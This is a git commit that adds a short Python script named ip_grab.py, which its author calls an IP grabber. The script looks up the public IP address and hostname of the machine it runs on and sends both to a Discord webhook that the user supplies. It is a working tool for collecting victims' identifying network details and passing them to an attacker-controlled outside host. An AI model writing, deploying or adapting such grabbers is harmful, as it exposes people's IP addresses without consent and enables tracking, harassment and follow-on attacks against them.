9b906f684f5cc5ef045cc0ca7ba6dbce102e33f9
Wungiel <47087989+Syntetik008@users.noreply.github.com>
2021-03-30 12:26:43 +0200

    Le code
    Le code of Le ip grabber

---
+++ ip_grab.py
@@ -0,0 +1,24 @@
+import requests
+import json
+import socket
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
+# getting ip addres
+def get_ip():
+    r = requests.get('https://api.ipify.org/')
+    rct = r.text
+    return rct
+
+webhook = DiscordWebhook(url='Put your webhook url here')
+
+# create embed object for webhook
+# you can set the color as a decimal (color=242424) or hex (color='03b2f8') number
+embed = DiscordEmbed(title=str(socket.gethostname()) + "'s IP", description=get_ip(), color='03b2f8')
+
+# set footer
+embed.set_footer(text='IP grabber by xNatok#0442')
+
+# add embed object to webhook
+webhook.add_embed(embed)
+
+response = webhook.execute()
